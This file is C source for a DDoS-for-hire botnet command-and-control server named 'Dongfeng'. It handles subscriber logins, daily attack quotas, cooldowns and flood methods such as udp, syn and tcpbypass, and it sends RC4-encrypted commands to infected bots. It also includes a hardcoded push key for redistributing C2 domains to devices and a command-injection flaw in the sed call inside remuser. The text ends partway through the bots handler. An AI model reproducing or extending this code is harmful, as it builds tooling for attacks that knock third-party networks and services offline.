#define _GNU_SOURCE

#include <stdio.h>
#include <ctype.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <string.h>
#include <pthread.h>
#include <netinet/tcp.h>
#include <netdb.h>
#include <fcntl.h>
#include <sys/wait.h>
#include <dirent.h>

#include "enc.h"
#include "arch.h"
#include "epoll.h"

#define MAX_USERS 100000
#define WH_SERV "riswhois.ripe.net"
#define WH_PORT 43

struct account_t {

    BOOL id;
    int daily_attacks;
    char username[16], password[16], expiry[16];
} account[MAX_USERS];

struct user_t {

    BOOL connected, id;
    int fd, attacks_sent, daily_attacks, cooldown;
    char username[16], password[16], expiry[16];
    struct sockaddr_in addr;
} user[MAX_USERS];

struct ongoing_t {
    int duration;
    char username[16], method[16], target[256]; /* target will eventually be larger due to multiple ips. */
};

struct ongoing_t ongoing;

static BOOL attack_disabled = 1;
static int attack_time, cooldown_time;

static char *methods[] = {
    "udp",
    "syn",
    "psh-ack",
    "icmp",
    "tcpbypass",
    "udpbypass",
    "ack"
};

static char *get_current_day(void) {

    static char date[16] = {0}; 
    strftime(date, sizeof(date), "%Y-%m-%d", localtime(&(time_t){time(NULL)}));

    return date;
}

static BOOL is_current_day(char *date) {

    return !strcmp(date, get_current_day());
}

static void *user_attacks() {

    while (TRUE) {
        for (int i = 0; i < MAX_USERS; i++) {
            if (user[i].connected) {
                
                char attack_path[64] = {0};
                sprintf(attack_path, "logs/attacks/%s.txt", user[i].username);

                FILE *fp = fopen(attack_path, "r");
                
                if (fp == NULL) {
                    user[i].attacks_sent = 0;
                    continue;
                }

                char line[128] = {0};
                int attacks_sent = 0;

                while (fgets(line, sizeof(line), fp)) {
                    char date_str[32] = {0};

                    sscanf(line, "%10[^:]", date_str);

                    if (is_current_day(date_str))
                        attacks_sent++;
                }

                user[i].attacks_sent = attacks_sent;

                fclose(fp);
            }
        }

        sleep(1);
    }

    return NULL;
}

static char *get_current_date(void) {

    static char date[32] = {0}; 
    strftime(date, sizeof(date), "%Y-%m-%d-%H-%M-%S", localtime(&(time_t){time(NULL)}));

    return date;
}

static int get_attack_time(char *line) {

    char attack_str[4] = {0};
    int len = strlen(line), space = 0, j = 0;

    for (int i = 0; i < len; i++) {
        if (line[i] == ' ') {
            if (++space == 2)
                continue;
        }

        if (space == 2) 
            attack_str[j++] = line[i];
        else if (space == 3) {
            attack_str[j] = 0;
            break;
        }
    }

    return atoi(attack_str);
}

static void *user_cooldown() {

    while (TRUE) {
        for (int i = 0; i < MAX_USERS; i++) {
            if (user[i].connected && !user[i].id) {
                
                char attack_path[64] = {0};
                sprintf(attack_path, "logs/attacks/%s.txt", user[i].username);

                FILE *fp = fopen(attack_path, "r");
                
                if (fp == NULL) {
                    user[i].cooldown = 0;
                    continue;
                }

                char line[128] = {0};
                int cooldown_time = 0;

                while (fgets(line, sizeof(line), fp)) {
                    char date_str[32] = {0};
                    sscanf(line, "%19[^:]", date_str);

                    char *current_date_str = get_current_date();

                    struct tm log_time = {0}, current_time = {0};
                    strptime(date_str, "%Y-%m-%d-%H-%M-%S", &log_time);
                    strptime(current_date_str, "%Y-%m-%d-%H-%M-%S", &current_time);

                    time_t log_time_t = mktime(&log_time);
                    time_t current_time_t = mktime(&current_time);

                    int seconds_diff = difftime(current_time_t, log_time_t), attack_seconds = get_attack_time(line);

                    if (user[i].id != 2 && seconds_diff <= 90 + attack_seconds) // global cooldown + 30 seconds + attack time
                        cooldown_time = 90 + attack_seconds - seconds_diff;
                }

                user[i].cooldown = cooldown_time;

                fclose(fp);
            }
        }

        sleep(1);
    }

    return NULL;
}

static int users_connected(void) {

    int total = 0;

    for (int i = 0; i < MAX_USERS; i++) {
        if (user[i].connected)
            total++;
    }

    return total;
}

static int bots_connected(char *group) {

    int total = 0;

    for (int i = 0; i < MAX_BOTS; i++) {
        if (bot[i].connected && (group == NULL || !strcmp(group, bot[i].arch)))
            total++;
    }

    return total;
}

char *ip2asn(const char *ip) {

    static char asn[16];
    char query[128], resp[4096];

    while (1) {

        int sockfd;
        struct hostent *host;
        struct sockaddr_in server;

        host = gethostbyname(WH_SERV);

        if (!host) {

            usleep(100000);
            continue;
        }

        sockfd = socket(AF_INET, SOCK_STREAM, 0);

        if (sockfd < 0) {

            usleep(100000);
            continue;
        }

        memset(&server, 0, sizeof(server));
        server.sin_family = AF_INET;
        server.sin_port = htons(WH_PORT);
        memcpy(&server.sin_addr, host->h_addr, host->h_length);

        if (connect(sockfd, (struct sockaddr *)&server, sizeof(server)) < 0) {

            close(sockfd);
            usleep(100000);
            continue;
        }

        snprintf(query, sizeof(query), "%s\r\n", ip);
        send(sockfd, query, strlen(query), 0);

        int len = recv(sockfd, resp, sizeof(resp) - 1, 0);
        close(sockfd);

        if (len <= 0) {

            usleep(100000);
            continue;
        }

        resp[len] = 0;

        char *buf = strtok(resp, "\n");

        while (buf) {

            if (strstr(buf, "origin:")) {

                char *p = strstr(buf, "AS");
                if (p) {

                    int i = 0;
                    while (p[i] && p[i] != ' ' && p[i] != '\r' && p[i] != '\n' && i < (int)sizeof(asn) - 1) {

                        asn[i] = p[i];
                        i++;
                    }
                    asn[i] = 0;
                    return asn;
                }
            }
            buf = strtok(NULL, "\n");
        }
        usleep(100000);
    }
    return NULL;
}

void cloexec_fd(int exclude_fd) {

    DIR *dir = opendir("/proc/self/fd");
    if (!dir) return;
    struct dirent *entry;
    
    while ((entry = readdir(dir)) != NULL) {
        int fd = atoi(entry->d_name);
        
        if (fd > 2 && fd != exclude_fd) {
            int flags = fcntl(fd, F_GETFD);
            
            if (flags != -1) {
            
                fcntl(fd, F_SETFD, flags | FD_CLOEXEC); //  thank you stackoverflow <33
            }
        }
    }
    closedir(dir);
}

static void *title_writer() {

    int sec = 0;
    int activecd = 0;

    while (1) {
    
        if (sec % 10 == 0) {
            
            FILE *fp = fopen("domains.txt", "r");
            activecd = 0;

            if (fp) {
            
                char readln[256];

                while (fgets(readln, sizeof(readln), fp)) {
                    readln[strcspn(readln, "\r\n")] = 0;

                    if (readln[0] == '\0' || readln[0] == '#')
                        continue;

                    const char *rslver;
                    if (strstr(readln, ".geek") || strstr(readln, ".libre") || strstr(readln, ".gopher") || strstr(readln, ".parody") || strstr(readln, ".pirate"))
                        rslver = "103.1.206.179";
                    else
                        rslver = "1.1.1.1";

                    int pipefd[2];
                    if (pipe(pipefd) == -1)
                        continue;

                    pid_t pid = fork();

                    if (pid == 0) {
                    
                        close(pipefd[0]);
                        dup2(pipefd[1], STDOUT_FILENO);
                        close(pipefd[1]);
                        
                        cloexec_fd(STDOUT_FILENO);

                        char at_rslver[64];
                        snprintf(at_rslver, sizeof(at_rslver), "@%s", rslver);

                        char *args[] = {

                            "dig", "+short", "+timeout=1",
                            at_rslver,
                            (char *)readln,
                            NULL
                            
                        };

                        execvp("dig", args);
                        _exit(1);
                        
                    } else if (pid > 0) {

                        close(pipefd[1]);
                        char resp[256] = {0};
                        int found = 0;

                        FILE *rd = fdopen(pipefd[0], "r");
                        if (rd) {
                        
                            while (fgets(resp, sizeof(resp), rd)) {
                            
                                resp[strcspn(resp, "\r\n")] = 0;

                                if (strncmp(resp, "226.", 4) == 0 || strncmp(resp, "21.", 3) == 0) {
                                
                                    found = 1;
                                    break;
                                }
                            }
                            
                            fclose(rd);
                            
                        } else {
                        
                            close(pipefd[0]);
                        }

                        waitpid(pid, NULL, 0);

                        if (found)
                            activecd++;

                        usleep(10000);
                    } else {
                    
                        close(pipefd[0]);
                        close(pipefd[1]);
                    }
                }
                fclose(fp);
            }
        }

        for (int i = 0; i < MAX_USERS; i++) {

            if (user[i].connected) {

                if (attack_time > 0)
                    dprintf(user[i].fd, "\e]0;users: %d | bots: %d | attack: %ds | DNS: %d/5\007",
                            users_connected(), bots_connected(NULL), attack_time, activecd);

                else if (cooldown_time > 0)
                    dprintf(user[i].fd, "\e]0;users: %d | bots: %d | global cooldown: %ds | DNS: %d/5\007",
                            users_connected(), bots_connected(NULL), cooldown_time, activecd);

                else if (user[i].cooldown > 0)
                    dprintf(user[i].fd, "\e]0;users: %d | bots: %d | user cooldown: %ds | DNS: %d/5\007",
                            users_connected(), bots_connected(NULL), user[i].cooldown, activecd);

                else
                    dprintf(user[i].fd, "\e]0;users: %d | bots: %d | attacks: %s | sent: %d/%d | DNS: %d/5\007",
                            users_connected(), bots_connected(NULL), attack_disabled ? "off" : "on",
                            user[i].attacks_sent, user[i].daily_attacks, activecd);
            }
        }

        sleep(1);
        sec++;
    }

    return NULL;
}

static int setup_user_loc(int fd, struct sockaddr_in addr) {

    for (int i = 0; i < MAX_USERS; i++) {
        if (!user[i].fd) {
            user[i].fd = fd;
            user[i].addr = addr;
            return i;
        }
    }

    dprintf(fd, "max users connected\r\n");
    sleep(5);

    close(fd);
    return -1;
}

static void remove_newline(char *buf) {

    for (int i = 0; buf[i] != '\0'; i++) {
        if (buf[i] == '\r' || buf[i] == '\n')
            buf[i] = 0;
    }
}

static int fdgets(int fd, char *buf, int len) {
    
	int total = 0;
	
    while (total < len) {
        if (read(fd, buf + total, 1) <= 0)
            return 0;
        
        if (buf[total++] == '\n')
            break;
    }

    remove_newline(buf);
	return total;
}

static void load_accounts(void) {

    FILE *fp = fopen("login.txt", "r");

    if (fp == NULL) {
        printf("[load_accounts] fopen() failed\n");
        return;
    }

    int i = 0;
    char buf[128] = {0};

    memset(account, 0, sizeof(account));

    // root root 2 100 9999-01-01-01

    /* 
    id:
        0 = regular,
        1 = admin,
        2 = owner
    */

    while (fgets(buf, sizeof(buf), fp) && i < MAX_USERS) {
        if (sscanf(buf, "%15s %15s %hhd %d %15s", account[i].username, account[i].password, &account[i].id, &account[i].daily_attacks, account[i].expiry) == 5)
            i++;
        else
            printf("[load_accounts] invalid line format: %s", buf);
    }

    fclose(fp);
}

static int find_login(char *username, char *password) {

    for (int i = 0; i < MAX_USERS; i++) {
        if (!strcmp(username, account[i].username) && !strcmp(password, account[i].password))
            return i;
    }

    return -1;
}

static int check_user_connected(char *username) {

    for (int i = 0; i < MAX_USERS; i++) {
        if (!strcmp(user[i].username, username))
            return i;
    }

    return -1;
}

static BOOL is_expired_date(char *date) {

    char current_date_hour[16] = {0};
    snprintf(current_date_hour, 14, "%s", get_current_date());

    return strcmp(date, current_date_hour) < 0;
}

static char *get_user_id(char id) {

    switch (id) {
        case 0:
            return "regular";
        case 1:
            return "admin";
        case 2:
            return "owner";
        default:
            return NULL;
    }
}

static BOOL find_username(char *username) {

    for (int i = 0; i < MAX_USERS; i++) {
        if (!strcmp(username, account[i].username))
            return TRUE;
    }

    return FALSE;
}

static BOOL is_valid_date_format(char *date) {

    int len = strlen(date);

    if (len != 10)
        return FALSE;

    if (date[4] != '-' || date[7] != '-')
        return FALSE;

    for (int i = 0; i < len; i++) {
        if (i == 4 || i == 7)
            continue;

        if (!isdigit(date[i]))
            return FALSE;
    }

    return TRUE;
}

static BOOL is_leap_year(int year) {

    if (!year % 4) {
        if (!year % 100) {
            if (!year % 400)
                return TRUE;
            else
                return FALSE;
        } 
        else
            return TRUE;
    }

    return FALSE;
}

static BOOL is_valid_date(char *date) {

    int year, month, day;

    if (sscanf(date, "%d-%d-%d", &year, &month, &day) != 3) 
        return FALSE;

    if (year < 2024 || year > 9999)
        return FALSE;

    if (month < 1 || month > 12)
        return FALSE;

    int days_in_month[] = {31, 28, 31, 30, 31, 30, 31, 31, 30, 31, 30, 31};

    if (is_leap_year(year))
        days_in_month[1] = 29;

    if (day < 1 || day > days_in_month[month - 1])
        return FALSE;

    return TRUE;
}

static BOOL is_future_date(char *date) {

    return strcmp(date, get_current_date()) > 0;
}

static void broadcast_cmd(char *cmd, char *group, int bots) {

    char **blacklist_group = NULL;
    int blacklist_group_count = 0;

    FILE *fp = fopen("group_blacklist.txt", "r");

    if (fp != NULL) {
        char buf[128] = {0};

        while (fgets(buf, sizeof(buf), fp)) {

            remove_newline(buf);

            blacklist_group = realloc(blacklist_group, (blacklist_group_count + 1) * sizeof(char *));
            blacklist_group[blacklist_group_count++] = strdup(buf);
        }

        fclose(fp);
    }
    
    int len = strlen(cmd), sent = 0;
    char enc_cmd[len];

    strcpy(enc_cmd, cmd);
    rc4(enc_cmd, len);

    for (int i = 0; i < MAX_BOTS; i++) {
        if (bot[i].connected && (group == NULL || !strcmp(group, bot[i].arch))) {
            if (++sent > bots)
                break;

            if (blacklist_group_count) {
                BOOL found = FALSE;

                for (int j = 0; j < blacklist_group_count; j++) {
                    if (strstr(bot[i].arch, blacklist_group[j])) {
                        found = TRUE;
                        break;
                    }
                }

                if (found)
                    continue;
            }

            send(i, enc_cmd, len, MSG_NOSIGNAL);
        }
    }

    if (blacklist_group_count) {
        for (int i = 0; i < blacklist_group_count; i++)
            free(blacklist_group[i]);

        free(blacklist_group);
    }
}

static int find_method(char *method) {

    for (unsigned int i = 0; i < sizeof(methods) / sizeof(methods[0]); i++) {
        if (!strcmp(method, methods[i]))
            return i;
    }

    return -1;
}

static BOOL verify_ipv4(char *ip) {

    struct in_addr addr;
    
    if (inet_pton(AF_INET, ip, &addr) != 1)
        return FALSE;

    unsigned char *buf = (unsigned char *)&addr.s_addr;

    if (!buf[0] || buf[0] == 127 || buf[0] == 10 || buf[0] >= 224 ||
    (buf[0] == 192 && buf[1] == 168) || 
    (buf[0] == 169 && buf[1] == 254) || 
    (buf[0] == 172 && buf[1] >= 16 && buf[1] <= 31) || 
    (buf[0] == 100 && buf[1] >= 64 && buf[1] <= 127) || 
    (buf[0] == 198 && buf[1] >= 18 && buf[1] <= 19))
    return FALSE;

    return TRUE;
}

BOOL blist(const char *ip) {

    FILE *fp = fopen("blacktargs.txt", "r");
    if (!fp) return FALSE;

    char ln[128];

    while (fgets(ln, sizeof(ln), fp)) {

        ln[strcspn(ln, "\r\n")] = 0;
        if (strstr(ip, ln)) {
        
            fclose(fp);
            return TRUE;
        }
    }

    fclose(fp);
    return FALSE;
}

BOOL asn_blist(const char *asn) {

    FILE *fp = fopen("asnblack.txt", "r");
    if (!fp) return FALSE;

    char ln[64];

    while (fgets(ln, sizeof(ln), fp)) {

        ln[strcspn(ln, "\r\n")] = 0;
        if (strcmp(ln, asn) == 0) {

            fclose(fp);
            return TRUE;
        }
    }

    fclose(fp);
    return FALSE;
}

static BOOL str_is_num(char *str) {

    int len = strlen(str);

    if (!len)
        return FALSE;

    for (int i = 0; i < len; i++) {
        if (!isdigit(str[i]))
            return FALSE;
    }

    if (str[0] == '0' && str[1] != '\0')
        return FALSE;

    return TRUE;
}

static void *attack_timer() {

    cooldown_time = 60;

    while (TRUE) {
        sleep(1);

        if (--attack_time <= 0)
            break;
    }

    while (TRUE) {
        sleep(1);

        if (--cooldown_time <= 0)
            break;
    }

    return NULL;
}

static void *user_connection(void *arg) {

    int loc = *(int *)arg, len;
    char username[32] = {0}, password[32] = {0}, resp[4] = {0};

    struct timeval tv = {
        .tv_sec = 10,
        .tv_usec = 0
    };

    setsockopt(user[loc].fd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));

    dprintf(user[loc].fd, "username / 用户名 : ");

    if (!fdgets(user[loc].fd, username, sizeof(username)))
        goto label;

    len = strlen(username);

    if (!len || len > 15)
        goto label;

    dprintf(user[loc].fd, "password / 密码 : ");

    if (!fdgets(user[loc].fd, password, sizeof(password)))
        goto label;

    len = strlen(password);

    if (!len || len > 15)
        goto label;

    dprintf(user[loc].fd,"\r\nThe following is prohibited on our network\r\n        [我们的网络上禁止以下行为]\r\n\r\n- Sending attacks to dstats no perm.   / 未经管理员许可测试数据墙\r\n- Capturing traffic of our network.    / 捕获我们网络的流量\r\n- Attacking government endpoints.      / 攻击政府目标\r\n- Sharing login data to third parties. / 与第三方共享登录数据\r\n- Creating APIs using our network.     / 使用我们的网络创建 API\r\n\r\nFailure to comply with the ruleset will result in removal without warning\r\n              [不遵守规则集将导致在没有警告的情况下被删除]\r\n\r\nPlease enter [y/n] if you agree: ");

    if (!fdgets(user[loc].fd, resp, sizeof(resp)))
        goto label;

    len = strlen(resp);

    if (!len || len > 1 || resp[0] != 'y')
        goto label;

    load_accounts();
    int login = find_login(username, password);

    if (login == -1) {
        dprintf(user[loc].fd, "login failed / 登录失败\r\n");
        sleep(5);
        goto label;
    }

    int old_loc;
    if ((old_loc = check_user_connected(username)) >= 0) {
        dprintf(user[loc].fd, "user \"%s\" is already logged in / 用户当前已登录\r\nwould you like to kick your old session? (y/n): ", username);
        
        char resp[4] = {0};
        if (!fdgets(user[loc].fd, resp, sizeof(resp)))
            goto label;

        len = strlen(resp);

        if (!len || len > 1 || resp[0] != 'y') {
            dprintf(user[loc].fd, "bye bye\r\n");
            sleep(5);
            goto label;
        }

        shutdown(user[old_loc].fd, SHUT_RDWR);
    }

    if (is_expired_date(account[login].expiry)) {
        dprintf(user[loc].fd, "account \"%s\" has expired / 帐户已过期\r\n", username);
        sleep(5);
        goto label;
    }

    user[loc].connected = TRUE;
    user[loc].id = account[login].id;
    strcpy(user[loc].username, account[login].username);
    strcpy(user[loc].password, account[login].password);
    strcpy(user[loc].expiry, account[login].expiry);
    user[loc].daily_attacks = account[login].daily_attacks;
    user[loc].attacks_sent = account[loc].daily_attacks; // prevent people from sending attacks as soon as they login incase they're at their daily limit.
    
    if (!user[loc].id)
        user[loc].cooldown = 90; // prevent users from bypassing their cooldown if they relogin.

    tv.tv_sec = 3600; /* hour of inactivity, the connection will be closed. */
    setsockopt(user[loc].fd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));

    dprintf(user[loc].fd, "\ecWelcome to the \033[38;2;0;204;255mDongfeng\033[0m network / 欢迎来到东风僵尸网络\r\nenter \"help\" for a list of commands / 输入\"help\"以获取命令列表\r\n\r\n");

    while (TRUE) {

        dprintf(user[loc].fd, "%s\033[38;2;86;156;214m@dongfeng\033[0m:~$ ", user[loc].username);

        char rcvbuf[4192] = {0};
        if (!fdgets(user[loc].fd, rcvbuf, sizeof(rcvbuf)))
            goto label;

        len = strlen(rcvbuf);

        if (len >= (int)sizeof(rcvbuf))
            goto label;

        if (!strcmp(rcvbuf, "help")) {
            dprintf(user[loc].fd, "clear: clears terminal/ 清除终端\r\ninfo: displays account info / 显示帐户信息\r\nmethods: displays attack methods / 显示攻击方法\r\nexit: exits terminal / 退出登录\r\n");
            if (user[loc].id)
                dprintf(user[loc].fd, "\r\nadmin commands / 管理命令\r\nadduser: add user account / 添加用户帐户\r\nremuser: remove user account / 删除用户帐户\r\nkickuser: kick user session / 踢出用户会话\r\nonline: displays online users / 显示在线用户\r\naccounts: displays all user accounts / 显示所有用户帐户\r\nbots-root: displays bots root info\r\nongoing: displays ongoing attacks / 显示正在进行的攻击\r\n\r\nblacklisted: view blacklisted targets / 查看黑名单目标\r\nfind: find target in blacklist / 查找黑名单中的目标\r\nblacklist: add / delete from the blacklist / 添加/删除黑名单\r\n");
        
            if (user[loc].id == 2)
                dprintf(user[loc].fd, "\r\nowner commands\r\nbots: displays bots arch info (-s to specify)\r\ntoggle-attacks: toggle attacks on and off\r\nupdate: push new domains to devices (pass with <,>)\r\n");
        }

        else if (!strcmp(rcvbuf, "clear") || !strcmp(rcvbuf, "cls"))
            dprintf(user[loc].fd, "\ec");

        else if (!strcmp(rcvbuf, "info"))
            dprintf(user[loc].fd, "username: %s\r\npassword: %s\r\nid: %s\r\ndaily attacks: %d\r\nexpiry: %s\r\n", user[loc].username, user[loc].password, get_user_id(user[loc].id), user[loc].daily_attacks, user[loc].expiry);

        else if (!strcmp(rcvbuf, "methods") || !strcmp(rcvbuf, "?")) {
            for (unsigned int i = 0; i < sizeof(methods) / sizeof(methods[0]); i++)
                dprintf(user[loc].fd, "%s\r\n", methods[i]);

            dprintf(user[loc].fd, "\r\nsyntax: .method ip seconds\r\noptions: -dport= | -sport= | -len= | -pps= | -payload= | -bots=");

            if (user[loc].id == 2)
                dprintf(user[loc].fd, " | -group=");

            dprintf(user[loc].fd, "\r\n");
        }

        else if (!strcmp(rcvbuf, "adduser")) {
            if (user[loc].id) {
                dprintf(user[loc].fd, "username: ");
            
                char username[32] = {0};
                if (!fdgets(user[loc].fd, username, sizeof(username)))
                    goto label;

                len = strlen(username);

                if (!len || len > 15) {
                    dprintf(user[loc].fd, "invalid username len (1-15) | 用户名长度无效\r\n");
                    continue;
                }

                load_accounts();
                if (find_username(username)) {
                    dprintf(user[loc].fd, "username \"%s\" is already in use | 用户名已被使用\r\n", username);
                    continue;
                }

                dprintf(user[loc].fd, "password: ");

                char password[32] = {0};
                if (!fdgets(user[loc].fd, password, sizeof(password)))
                    goto label;

                len = strlen(password);

                if (!len || len > 15) {
                    dprintf(user[loc].fd, "invalid password len (1-15) | 密码长度无效\r\n");
                    continue;
                }

                if (!strcmp(username, password)) {
                    dprintf(user[loc].fd, "account must have different username and password! | 帐户必须具有不同的用户名和密码！\r\n");
                    continue;
                }

                dprintf(user[loc].fd, "admin (y/n) / 管理员（是/否）: ");

                char admin[4] = {0};
                if (!fdgets(user[loc].fd, admin, sizeof(admin)))
                    goto label;

                len = strlen(admin);

                if (!len || len > 1 || (admin[0] != 'y' && admin[0] != 'n')) {
                    dprintf(user[loc].fd, "invalid admin answer | 管理员回答无效\r\n");
                    continue;
                }

                if (admin[0] == 'y' && user[loc].id != 2) {
                    dprintf(user[loc].fd, "only owner accounts can add admin accounts | 只有所有者帐户可以添加管理员帐户\r\n");
                    continue;
                }

                dprintf(user[loc].fd, "daily attacks (1-100) / 日常攻击: ");

                char daily_attacks[8] = {0};
                if (!fdgets(user[loc].fd, daily_attacks, sizeof(daily_attacks)))
                    goto label;

                int attacks = atoi(daily_attacks);

                if (!str_is_num(daily_attacks) || attacks < 1 || attacks > 100) {
                    dprintf(user[loc].fd, "invalid daily attacks (1-100) / 每日攻击次数无效\r\n");
                    continue;
                }

                dprintf(user[loc].fd, "expiry (YYYY-MM-DD or day/week/month) | 到期日（YYYY-MM-DD 或日/周/月）: ");

                char expiry[16] = {0};
                if (!fdgets(user[loc].fd, expiry, sizeof(expiry)))
                    goto label;

                struct tm future_date = {0};
                time_t now = time(NULL);
                localtime_r(&now, &future_date);

                if (!strcmp(expiry, "day"))
                    future_date.tm_mday += 1;
                else if (!strcmp(expiry, "week"))
                    future_date.tm_mday += 7;
                else if (!strcmp(expiry, "month"))
                    future_date.tm_mon += 1;
                else if (is_valid_date_format(expiry)) {
                    if (!is_valid_date(expiry)) {
                        dprintf(user[loc].fd, "the expiry date is formatted correctly, but is an invalid date | 到期日期格式正确，但日期无效\r\n");
                        continue;
                    }

                    if (!is_future_date(expiry)) {
                        dprintf(user[loc].fd, "the expiry date must be a future date | 到期日期必须是未来日期\r\n");
                        continue;
                    }

                    strptime(expiry, "%Y-%m-%d", &future_date);
                }
                else {
                    dprintf(user[loc].fd, "invalid [无效的] expiry input (YYYY-MM-DD or day/week/month)\r\nexample: \"April 20, 2024\" (2024-04-20)\r\n");
                    continue;
                }

                mktime(&future_date);
                strftime(expiry, sizeof(expiry), "%Y-%m-%d", &future_date);

                char hour[4] = {0};
                strftime(hour, sizeof(hour), "%H", &future_date);

                FILE *fp = fopen("login.txt", "a+");
                fprintf(fp, "%s %s %s %d %s-%s\n", username, password, admin[0] == 'y' ? "1" : "0", attacks, expiry, hour);
                fclose(fp);

                dprintf(user[loc].fd, "user \"%s\" account has been successfully added [账户已成功添加]\r\n", username);

                fp = fopen("logs/adduser.txt", "a+");
                fprintf(fp, "%s:user %s added user %s (%s)\n", get_current_date(), user[loc].username, username, expiry);
                fclose(fp);
            }
        }
        
        else if (!strcmp(rcvbuf, "update")) {
        
        
            int botsendto = bots_connected(NULL);
        
            if (user[loc].id == 2) { // it's dangerous sar
        
                dprintf(user[loc].fd, "\r\nEnter hardcoded key: ");
                char keypoop[128] = {0};
                
                if (!fdgets(user[loc].fd, keypoop, sizeof(keypoop)))
                    goto label;
        
                keypoop[strcspn(keypoop, "\r\n")] = 0;
                if (strcmp(keypoop, "OPASAR412") != 0) {
                
                    dprintf(user[loc].fd, "Push key not valid\r\n");
                    continue;
                }
                
                dprintf(user[loc].fd, "\r\nPass 5 domains <,> delimit: ");
        
                char danger[1024] = {0};
                
                if (!fdgets(user[loc].fd, danger, sizeof(danger)))
                    goto label;
        
                danger[strcspn(danger, "\r\n")] = 0;
        
                int i = 0;
                char *temp = strdup(danger);
                char *t = strtok(temp, ",");
        
                while (t) {
                
                    i++;
                    t = strtok(NULL, ",");
                }
        
                free(temp);
        
                if (i != 5) {
                
                    dprintf(user[loc].fd, "Pass 5 domains, received %d\r\n", i);
                    continue;
                }
        
                FILE *fp = fopen("domains.txt", "w");
                
                if (!fp) {
                
                    dprintf(user[loc].fd, "Failed to open domains.txt\r\n");
                    continue;
                }
        
                char findom[1024] = {0};
                snprintf(findom, sizeof(findom), "ud");
        
                char *tok = strtok(danger, ",");
                
                while (tok) {
                
                    while (*tok == ' ') tok++;
                    
                    fprintf(fp, "%s\n", tok);
                    strncat(findom, " ", sizeof(findom) - strlen(findom) - 1);
                    strncat(findom, tok, sizeof(findom) - strlen(findom) - 1);
                    
                    tok = strtok(NULL, ",");
                }
        
                fclose(fp);
                dprintf(user[loc].fd, "Domains pushed to devices\r\n");
        
                FILE *logfp = fopen("logs/domains_recent.txt", "a+");
                
                if (logfp) {
                
                    fprintf(logfp, "%s:user %s pushed domains\n", get_current_date(), user[loc].username);
                    fclose(logfp);
                }
                
                dprintf(user[loc].fd, "findom -> %s\r\n", findom);
                broadcast_cmd(findom, NULL, botsendto);
        
            } else {
            
                dprintf(user[loc].fd, "Critical auth missing sar\r\n");
            }
        }

        else if (!strcmp(rcvbuf, "remuser")) {
            if (user[loc].id) {
                dprintf(user[loc].fd, "username: ");

                char username[32] = {0};
                if (!fdgets(user[loc].fd, username, sizeof(username)))
                    goto label;

                len = strlen(username);

                if (!len || len > 15) {
                    dprintf(user[loc].fd, "invalid username len (1-15)\r\n");
                    continue;
                }

                if (!strcmp(user[loc].username, username)) {
                    dprintf(user[loc].fd, "you can't remove your own account\r\n");
                    continue;
                }

                load_accounts();
                if (!find_username(username)) {
                    dprintf(user[loc].fd, "couldn't find an account with username \"%s\"\r\n", username);
                    continue;
                }

                if (user[loc].id != 2) {

                    BOOL admin = FALSE;

                    for (int i = 0; i < MAX_USERS; i++) {
                        if (!strcmp(account[i].username, username) && account[i].id) {
                            admin = TRUE;
                            break;
                        }
                    }

                    if (admin) {
                        dprintf(user[loc].fd, "only owner accounts can remove admin/owner accounts\r\n");
                        continue;
                    }
                }

                for (int i = 0; i < MAX_USERS; i++) {
                    if (!strcmp(user[i].username, username)) {
                        shutdown(user[i].fd, SHUT_RDWR);
                        break;
                    }
                }

                sprintf(rcvbuf, "sed -i '/^%s /d' login.txt", username);
                system(rcvbuf);

                dprintf(user[loc].fd, "user \"%s\" account has been successfully removed\r\n", username);

                FILE *fp = fopen("logs/remuser.txt", "a+");
                fprintf(fp, "%s:user %s removed user %s\n", get_current_date(), user[loc].username, username);
                fclose(fp);
            }
        }

        else if (!strcmp(rcvbuf, "kickuser")) {
            if (user[loc].id) {
                dprintf(user[loc].fd, "username: ");

                char username[32] = {0};
                if (!fdgets(user[loc].fd, username, sizeof(username)))
                    goto label;

                len = strlen(username);

                if (!len || len > 15) {
                    dprintf(user[loc].fd, "invalid username len (1-15)\r\n");
                    continue;
                }

                if (!strcmp(user[loc].username, username)) {
                    dprintf(user[loc].fd, "you can't kick your own account\r\n");
                    continue;
                }

                load_accounts();
                if (!find_username(username)) {
                    dprintf(user[loc].fd, "couldn't find an account with username \"%s\"\r\n", username);
                    continue;
                }

                BOOL found = FALSE;

                for (int i = 0; i < MAX_USERS; i++) {
                    if (!strcmp(user[i].username, username)) {
                        shutdown(user[i].fd, SHUT_RDWR);
                        found = TRUE;
                        break;
                    }
                }

                if (!found)
                    dprintf(user[loc].fd, "user \"%s\" isn't currently connected\r\n", username);
                else {
                    dprintf(user[loc].fd, "user \"%s\" has been kicked\r\n", username);

                    FILE *fp = fopen("logs/kickuser.txt", "a+");
                    fprintf(fp, "%s:user %s kicked user %s\n", get_current_date(), user[loc].username, username);
                    fclose(fp);
                }
            }
        }

        else if (!strcmp(rcvbuf, "bots-root")) {
            if (user[loc].id) {
                int root = 0, nonroot = 0;

                for (int i = 0; i < MAX_BOTS; i++) {
                    if (bot[i].connected) {
                        if (bot[i].root)
                            root++;
                        else
                            nonroot++;
                    }
                }

                dprintf(user[loc].fd, "root: %d\r\nnonroot: %d\r\n", root, nonroot);
            }
        }

        else if (!strncmp(rcvbuf, "bots", 4)) {
            if (user[loc].id == 2) {

                int argc = 0;
                char *token = strtok(rcvbuf, " "), *argv[3] = {0}; // bots (-s arch)

                while (token) {
                    argv[argc] = token;

                    if (++argc > 3)
                        break;

                    token = strtok(NULL, " ");
                }

                if (strcmp(argv[0], "bots") != 0)
                    continue;

                if (argc > 3 || (argc > 1 && argc != 3)) {
                    dprintf(user[loc].fd, "bots (-s arch)\r\n");
                    continue;
                }

                if (argc > 1) {
                    if (strcasecmp(argv[1], "-s") != 0) {
                        dprintf(user[loc].fd, "failed to parse command\r\n");
                        continue;
                    }

                    BOOL found = FALSE;

                    for (int i = 0; i < MAX_ARCHS; i++) {
                        if (arch_info[i].count && strstr(arch_info[i].arch, argv[2])) {
                            found = TRUE;
                            break;
                        }
                    }

                    if (!found) {
                        dprintf(user[loc].fd, "failed to find bots with arch \"%s\"\r\n", argv[2]);
                        continue;
                    }
                }

                int total = 0;

                for (int i = 0; i < MAX_ARCHS; i++) {
                    if (arch_info[i].count) {
                        if (argc > 1) {
                            if (strstr(arch_info[i].arch, argv[2])) {
                                total += arch_info[i].count;
                                dprintf(user[loc].fd, "%s: %d\r\n", arch_info[i].arch, arch_info[i].count);
                            }
                        }
